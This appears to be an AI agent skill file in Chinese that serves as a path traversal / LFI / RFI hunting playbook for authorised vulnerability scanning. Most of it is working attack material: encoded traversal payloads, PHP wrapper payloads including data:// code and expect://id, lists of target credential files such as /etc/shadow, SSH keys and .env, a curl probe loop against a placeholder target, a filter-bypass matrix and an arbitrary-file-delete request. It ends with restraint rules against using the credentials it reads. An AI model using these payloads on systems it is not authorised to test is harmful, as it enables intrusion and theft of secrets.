---
name: hunt-path-traversal
description: 路径遍历/LFI/RFI 挖掘：高危参数名与端点 TOP、编码梯度绕过、敏感文件目标库（Linux/Windows/JavaWeb/PHP/.NET）、PHP 伪协议与 Phar/Session/日志投毒链、任意文件删
whenToUse: 摸到文件路径入参（file/filename/path/page/include/download/url）或文件下载、预览、导出、解压功能时；目标为 PHP 站需额外探伪协议
role: vuln-scan
enabled: true
---

# 路径遍历 / LFI / RFI

## 1. 高危参数名（按 WooYun 频次）

| 参数 | 次数 | 场景 |
|---|---|---|
| `filename` | 63 | 文件下载/附件 |
| `filepath` | 30 | 路径指定 |
| `path` | 20 | 通用 |
| `hdfile` | 14 | 特定 CMS |
| `inputFile` | 9 | Resin / Java |
| `file` | 7 | 通用 |
| `filePath` | 4 | Java 驼峰 |
| `FileUrl` | 3 | ASP.NET |
| `XFileName` | 3 | 特定 CMS |

## 2. 高危端点 TOP

```
down.php(20)  download.jsp(17)  download.asp(13)  do_download.jsp(8)
download.php(7)  download.ashx(7)  viewsharenetdisk.php(6)  GetPage.ashx(6)
pic.php(4)  openfile.asp(4)
```

## 3. 探测：编码梯度（按顺序试）

```
../                   基础
%2e%2e%2f             单次 URL 编码
%252e%252e%252f       双重编码
..%c0%af  ..%c1%9c    超长 UTF-8（Tomcat / GlassFish）
%u002e%u002e%u2215    16-bit Unicode（IIS / 旧 Java）
....//  ....\/        过滤器删一次后剩 ../
..%2f%2e  %2e%2e/     混合
```

截断与协议：

```
../../../etc/passwd%00.jpg     PHP <5.3.4 / 旧 Java
/admin;.jpg                    IIS / Tomcat 分号路径
file:///etc/passwd
view-source:file:///etc/passwd
php://filter/convert.base64-encode/resource=index.php
zip://archive.zip%23shell.php
data://text/plain,<?php phpinfo();?>
expect://id
```

路径正则化绕过：`....//`、`..../`、`..\..\`、`/./`、`//`、`/;/`

## 4. 敏感文件目标库

**Linux**

```
/etc/passwd  /etc/shadow  /etc/hosts  /etc/group  /etc/sudoers
/root/.ssh/id_rsa  /root/.ssh/authorized_keys  /home/{user}/.ssh/id_rsa
/root/.bash_history  /home/{user}/.bash_history
/proc/self/environ    ← 启动环境变量，常含 secret（最高性价比）
/proc/self/cmdline  /proc/self/fd/{n}  /proc/{pid}/environ
/etc/nginx/nginx.conf  /etc/httpd/conf/httpd.conf  /etc/my.cnf
```

**Windows**

```
C:\windows\win.ini  C:\boot.ini  C:\windows\system32\drivers\etc\hosts
C:\windows\system32\inetsrv\config\applicationHost.config
C:\inetpub\wwwroot\web.config  C:\windows\repair\sam
```

**Java Web**

```
/WEB-INF/web.xml  /WEB-INF/classes/jdbc.properties
/WEB-INF/classes/applicationContext.xml  /WEB-INF/classes/application.yml
../WEB-INF/web.xml   /../WEB-INF/web.xml%3f
```

**PHP / 框架**

```
/config.php  /db.php  /conn.php  /wp-config.php
/config_global.php  /config_ucenter.php          Discuz
/application/config/database.php                  CodeIgniter
/config/database.php  /.env  /.env.production     Laravel
```

**.NET**

```
/web.config  /connectionStrings.config  /App_Data/database.mdf
```

## 5. 探针脚本

```bash
# 层级递增找拐点
for i in 1 2 3 4 5 6 7 8 9 10; do
  p=$(printf '../%.0s' $(seq 1 $i))
  curl -s "https://TARGET/down.php?file=${p}etc/passwd" | grep -q "root:" && echo "Hit: $i"
done

# Java Web 模式
curl "https://TARGET/download.jsp?path=../WEB-INF/web.xml"
curl "https://TARGET/download.aspx?file=../web.config"
```

## 6. Bypass 矩阵

| 拦截 | 绕过 |
|---|---|
| `../` 字面拦 | URL 编码 / 双编码 / Unicode 超长 / `....//` / `..\../` |
| 后缀白名单 | `%00` 截断、`;.jpg`、`/.jpg` |
| 黑名单 `passwd` | `pas%73wd`、大小写、全编码 |
| 绝对路径拦 | 相对 + 多 `../` |
| 多 `../` 拦 | 嵌套 `....//` |
| 仅允许某目录 | 规范化差异 `/allowed/../etc/passwd` |
| 长度限制 | 改短文件 `/etc/hosts` |

## 7. 成功指纹

```
root:x:0:0:root:/root:/bin/bash     → /etc/passwd
[boot loader] / [fonts]             → win.ini
<?xml + <web-app                    → web.xml
connectionString=                    → web.config
```

## 8. 影响升级链

```
读 /etc/passwd → 用户列表
  → /home/web/.ssh/id_rsa → SSH 私钥（不实际使用）
  → application.yml / .env → DB / Redis / API 密钥
  → /proc/self/environ → 启动 secret
  → /WEB-INF/classes/jdbc.properties → JDBC 连接串
```

**报告停在「配置文件 + 首行脱敏」**，不要用读到的凭据登录任何服务。

## 9. 任意文件删 / 覆盖

```
DELETE /api/upload?path=../../web/index.html
```

不要在真实生产文件上验证。测试目录下建 PoC 文件再删它。
CVSS：任意文件删 8.6；webroot 覆盖 9.8。

## 10. 不要做的事

- 禁：用读到的私钥/密码登录服务。
- 禁：读 `/etc/shadow`（看到 `root:x:` 即停）。
- 禁：批量读 `.bash_history` / `.aws/credentials`，只取 1 个 sample。
- 禁：删真实生产文件。
- 报：源码/配置必须脱敏，可附 sha256 证明拿到原文。

<!-- 改编自: src-hunter references/playbooks/path-traversal/ (4 文件) + PayloadsAllTheThings/Directory Traversal, 2026-11-01 -->
